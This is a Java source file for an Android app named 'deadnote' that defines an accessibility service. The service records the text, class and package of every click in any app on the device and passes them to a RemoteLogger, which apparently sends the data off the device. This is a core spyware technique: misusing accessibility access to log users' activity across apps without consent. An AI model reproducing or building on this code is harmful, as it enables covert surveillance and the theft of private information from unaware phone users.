package com.deadnote;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import com.deadnote.RemoteLogger;

public class ClickAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            CharSequence text = event.getText().isEmpty() ? "" : event.getText().get(0);
            String msg = "CLICK → " + event.getClassName()
                       + " | texto=" + text
                       + " | package=" + event.getPackageName();
            RemoteLogger.d("ClickTracker", msg);
        }
    }

    @Override
    public void onInterrupt() {
        // Requerido por la clase abstracta AccessibilityService
    }
}

